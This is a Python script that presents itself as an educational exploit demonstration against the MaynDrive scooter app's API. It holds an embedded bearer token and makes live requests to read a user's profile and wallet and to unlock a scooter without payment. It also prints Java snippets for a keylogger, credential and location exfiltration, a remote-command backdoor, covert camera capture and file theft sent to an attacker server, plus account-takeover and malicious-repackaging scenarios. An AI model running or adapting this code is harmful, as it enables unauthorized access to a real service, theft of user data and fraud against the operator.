#!/usr/bin/env python3
"""
MaynDrive Exploit Demonstration Script
‚ö†Ô∏è FOR EDUCATIONAL PURPOSES ONLY - DO NOT USE FOR MALICIOUS PURPOSES
"""

import requests
import json
import base64
import hashlib
from datetime import datetime

class MaynDriveExploitDemo:
    def __init__(self):
        self.base_url = "https://api.knotcity.io"
        self.headers = {
            "User-Agent": "Knot-mayndrive v1.1.34 (android)",
            "Content-Type": "application/json",
            "Accept": "application/json"
        }
        
    def demonstrate_api_key_extraction(self):
        """Demonstrate how hardcoded API keys could be extracted and used"""
        print("üîç DEMONSTRATION: API Key Extraction Exploit")
        print("=" * 50)
        
        # Simulated extracted credentials (from APK decompilation)
        extracted_credentials = {
            "bearer_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDM0OTMsInNlc3Npb25faWQiOiI5MzY1MTQ5Yi1lZDdkLTQ1Y2MtYTZiMi1lYTU0NmMyOWE2NGUiLCJpYXQiOjE3NTk0NDQxMDcsImV4cCI6MTc1OTQ0NzcwN30.ge09yj7PfvFgPeJsQmmfcm74YuQaU-dAgxtW21q-LHY",
            "api_endpoints": [
                "/api/application/users",
                "/api/application/vehicles/unlock",
                "/api/application/vehicles/freefloat/lock",
                "/api/application/vehicles/sn/{serial_number}",
                "/api/application/users/wallet"
            ]
        }
        
        print("üì± Simulated APK Decompilation Results:")
        print(f"   Bearer Token: {extracted_credentials['bearer_token'][:50]}...")
        print(f"   API Endpoints Found: {len(extracted_credentials['api_endpoints'])}")
        
        # Add authorization header
        self.headers["Authorization"] = f"Bearer {extracted_credentials['bearer_token']}"
        
        print("\nüéØ Potential Exploits with Extracted Credentials:")
        
        # 1. Access user data
        print("\n1. Unauthorized User Data Access:")
        try:
            response = requests.get(f"{self.base_url}/api/application/users", 
                                 headers=self.headers, timeout=5)
            if response.status_code == 200:
                print("   ‚úÖ SUCCESS: Could access user profile data")
                user_data = response.json()
                print(f"   üìä User ID: {user_data.get('id', 'N/A')}")
                print(f"   üìß Email: {user_data.get('email', 'N/A')}")
            else:
                print(f"   ‚ùå FAILED: HTTP {response.status_code}")
        except Exception as e:
            print(f"   ‚ö†Ô∏è  SIMULATION: {e}")
        
        # 2. Access wallet information
        print("\n2. Unauthorized Wallet Access:")
        try:
            response = requests.get(f"{self.base_url}/api/application/users/wallet", 
                                 headers=self.headers, timeout=5)
            if response.status_code == 200:
                print("   ‚úÖ SUCCESS: Could access wallet information")
                wallet_data = response.json()
                print(f"   üí∞ Wallet Data: {json.dumps(wallet_data, indent=2)[:100]}...")
            else:
                print(f"   ‚ùå FAILED: HTTP {response.status_code}")
        except Exception as e:
            print(f"   ‚ö†Ô∏è  SIMULATION: {e}")
        
        # 3. Attempt scooter unlock
        print("\n3. Unauthorized Scooter Unlock:")
        unlock_payload = {
            "serial_number": "SN12345",
            "lat": 40.7128,
            "lng": -74.0060
        }
        try:
            response = requests.post(f"{self.base_url}/api/application/vehicles/unlock", 
                                  json=unlock_payload, headers=self.headers, timeout=5)
            if response.status_code == 200:
                print("   ‚úÖ SUCCESS: Could unlock scooter without payment!")
                print("   üö® CRITICAL: Unauthorized scooter access achieved")
            else:
                print(f"   ‚ùå FAILED: HTTP {response.status_code}")
        except Exception as e:
            print(f"   ‚ö†Ô∏è  SIMULATION: {e}")
    
    def demonstrate_apk_modification(self):
        """Demonstrate how unsigned APK could be modified"""
        print("\nüîß DEMONSTRATION: APK Modification Exploit")
        print("=" * 50)
        
        print("üì± Simulated APK Modification Process:")
        print("1. ‚úÖ Decompile APK using apktool")
        print("2. ‚úÖ Extract AndroidManifest.xml and source code")
        print("3. ‚úÖ Identify key components:")
        print("   - MainActivity: city.knot.knotapp.ui.MainActivity")
        print("   - API endpoints: /api/application/*")
        print("   - Authentication logic")
        
        print("\nüéØ Potential Malicious Modifications:")
        
        # 1. Keylogger injection
        print("\n1. Keylogger Injection:")
        keylogger_code = '''
// Malicious code to inject
public class KeyloggerService extends Service {
    @Override
    public void onKeyDown(int keyCode, KeyEvent event) {
        // Capture keystrokes
        String key = KeyEvent.keyCodeToString(keyCode);
        sendToAttackerServer(key);
    }
}
        '''
        print("   üìù Malicious Code:")
        print("   " + keylogger_code.strip().replace('\n', '\n   '))
        print("   üéØ Impact: Capture all user keystrokes including passwords")
        
        # 2. Data exfiltration
        print("\n2. Data Exfiltration Code:")
        exfiltration_code = '''
// Code to steal user data
public void stealUserData() {
    // Get user credentials
    String email = getUserEmail();
    String password = getUserPassword();
    
    // Send to attacker server
    sendToAttackerServer(email, password);
    
    // Steal location data
    Location location = getCurrentLocation();
    sendToAttackerServer(location);
}
        '''
        print("   üìù Malicious Code:")
        print("   " + exfiltration_code.strip().replace('\n', '\n   '))
        print("   üéØ Impact: Steal user credentials and location data")
        
        # 3. Backdoor installation
        print("\n3. Backdoor Installation:")
        backdoor_code = '''
// Remote control backdoor
public class BackdoorService extends Service {
    public void executeRemoteCommand(String command) {
        switch(command) {
            case "unlock_all_scooters":
                unlockAllScooters();
                break;
            case "steal_wallet":
                stealWalletData();
                break;
            case "track_location":
                startLocationTracking();
                break;
        }
    }
}
        '''
        print("   üìù Malicious Code:")
        print("   " + backdoor_code.strip().replace('\n', '\n   '))
        print("   üéØ Impact: Remote control of the application")
    
    def demonstrate_network_interception(self):
        """Demonstrate network interception attacks"""
        print("\nüåê DEMONSTRATION: Network Interception Attack")
        print("=" * 50)
        
        print("üì± Simulated MITM Attack Setup:")
        print("1. ‚úÖ Set up rogue WiFi access point")
        print("2. ‚úÖ Configure proxy server (Burp Suite)")
        print("3. ‚úÖ Install malicious certificate on device")
        print("4. ‚úÖ Intercept HTTPS traffic")
        
        print("\nüéØ Intercepted API Requests:")
        
        # Simulate intercepted requests
        intercepted_requests = [
            {
                "endpoint": "/api/application/login",
                "method": "POST",
                "data": {
                    "email": "user@example.com",
                    "password": "password123",
                    "device": {
                        "uuid": "device-uuid-123",
                        "platform": "android"
                    }
                },
                "impact": "Steal user credentials"
            },
            {
                "endpoint": "/api/application/vehicles/unlock",
                "method": "POST",
                "data": {
                    "serial_number": "SN12345",
                    "lat": 40.7128,
                    "lng": -74.0060
                },
                "impact": "Modify scooter unlock requests"
            },
            {
                "endpoint": "/api/application/users/wallet",
                "method": "GET",
                "data": {},
                "impact": "Access wallet information"
            }
        ]
        
        for i, req in enumerate(intercepted_requests, 1):
            print(f"\n{i}. Intercepted Request:")
            print(f"   üìç Endpoint: {req['endpoint']}")
            print(f"   üîß Method: {req['method']}")
            print(f"   üìä Data: {json.dumps(req['data'], indent=6)}")
            print(f"   üéØ Impact: {req['impact']}")
        
        print("\nüö® Attack Modifications:")
        print("1. ‚úÖ Modify login requests to steal credentials")
        print("2. ‚úÖ Change scooter serial numbers in unlock requests")
        print("3. ‚úÖ Inject malicious data into API responses")
        print("4. ‚úÖ Perform session hijacking attacks")
    
    def demonstrate_permission_abuse(self):
        """Demonstrate permission abuse attacks"""
        print("\nüì± DEMONSTRATION: Permission Abuse Attack")
        print("=" * 50)
        
        dangerous_permissions = [
            {
                "permission": "android.permission.ACCESS_FINE_LOCATION",
                "abuse": "Continuous location tracking",
                "impact": "Privacy violation, surveillance"
            },
            {
                "permission": "android.permission.CAMERA",
                "abuse": "Unauthorized photo/video capture",
                "impact": "Privacy violation, blackmail potential"
            },
            {
                "permission": "android.permission.READ_EXTERNAL_STORAGE",
                "abuse": "Access to personal files and photos",
                "impact": "Data theft, privacy violation"
            }
        ]
        
        print("üì± Simulated Permission Abuse:")
        
        for perm in dangerous_permissions:
            print(f"\nüîç Permission: {perm['permission']}")
            print(f"   üéØ Abuse: {perm['abuse']}")
            print(f"   üö® Impact: {perm['impact']}")
            
            # Simulate abuse code
            if "LOCATION" in perm['permission']:
                abuse_code = '''
// Continuous location tracking
public void startLocationTracking() {
    LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
    lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000, 1, this);
    
    // Send location to attacker server every second
    Timer timer = new Timer();
    timer.schedule(new TimerTask() {
        public void run() {
            sendLocationToAttacker(getCurrentLocation());
        }
    }, 0, 1000);
}
                '''
            elif "CAMERA" in perm['permission']:
                abuse_code = '''
// Unauthorized camera access
public void capturePhoto() {
    Camera camera = Camera.open();
    camera.takePicture(null, null, new Camera.PictureCallback() {
        public void onPictureTaken(byte[] data, Camera camera) {
            // Send photo to attacker server
            sendPhotoToAttacker(data);
        }
    });
}
                '''
            else:
                abuse_code = '''
// Access external storage
public void stealPersonalFiles() {
    File externalDir = Environment.getExternalStorageDirectory();
    File[] files = externalDir.listFiles();
    
    for (File file : files) {
        if (file.isFile()) {
            // Send file to attacker server
            sendFileToAttacker(file);
        }
    }
}
                '''
            
            print("   üìù Abuse Code:")
            print("   " + abuse_code.strip().replace('\n', '\n   '))
    
    def demonstrate_attack_scenarios(self):
        """Demonstrate comprehensive attack scenarios"""
        print("\nüé≠ DEMONSTRATION: Comprehensive Attack Scenarios")
        print("=" * 50)
        
        scenarios = [
            {
                "name": "Complete Account Takeover",
                "steps": [
                    "1. Extract hardcoded API keys from APK",
                    "2. Use keys to access user account data",
                    "3. Intercept network traffic for additional tokens",
                    "4. Modify API requests to perform unauthorized actions",
                    "5. Access and modify user profile and wallet"
                ],
                "impact": "Complete control over user account"
            },
            {
                "name": "Scooter Fleet Manipulation",
                "steps": [
                    "1. Extract admin API keys from hardcoded secrets",
                    "2. Use keys to access admin endpoints",
                    "3. Unlock multiple scooters simultaneously",
                    "4. Manipulate scooter locations and status",
                    "5. Cause service disruption and financial losses"
                ],
                "impact": "Massive service disruption and financial damage"
            },
            {
                "name": "Malicious App Distribution",
                "steps": [
                    "1. Decompile unsigned MaynDrive APK",
                    "2. Inject keylogging and data exfiltration code",
                    "3. Repackage with attacker certificate",
                    "4. Distribute through unofficial channels",
                    "5. Collect user data from infected devices"
                ],
                "impact": "Mass infection and data theft"
            }
        ]
        
        for i, scenario in enumerate(scenarios, 1):
            print(f"\n{i}. {scenario['name']}:")
            print(f"   üéØ Impact: {scenario['impact']}")
            print("   üìã Attack Steps:")
            for step in scenario['steps']:
                print(f"      {step}")
    
    def run_demonstration(self):
        """Run the complete exploit demonstration"""
        print("üé≠ MaynDrive Vulnerability Exploit Demonstration")
        print("=" * 60)
        print("‚ö†Ô∏è  FOR EDUCATIONAL PURPOSES ONLY")
        print("‚ö†Ô∏è  DO NOT USE FOR MALICIOUS PURPOSES")
        print("=" * 60)
        
        self.demonstrate_api_key_extraction()
        self.demonstrate_apk_modification()
        self.demonstrate_network_interception()
        self.demonstrate_permission_abuse()
        self.demonstrate_attack_scenarios()
        
        print("\n" + "=" * 60)
        print("üìä DEMONSTRATION COMPLETE")
        print("=" * 60)
        print("üö® Key Takeaways:")
        print("1. Hardcoded secrets enable complete API access")
        print("2. Unsigned APK allows malicious code injection")
        print("3. Network interception enables MITM attacks")
        print("4. Dangerous permissions enable privacy violations")
        print("5. Combined vulnerabilities create sophisticated attack vectors")
        print("\nüõ°Ô∏è Mitigation Required:")
        print("1. Remove all hardcoded secrets")
        print("2. Sign APK with valid certificate")
        print("3. Implement certificate pinning")
        print("4. Minimize dangerous permissions")
        print("5. Implement runtime security monitoring")

def main():
    """Main demonstration function"""
    demo = MaynDriveExploitDemo()
    demo.run_demonstration()

if __name__ == "__main__":
    main()
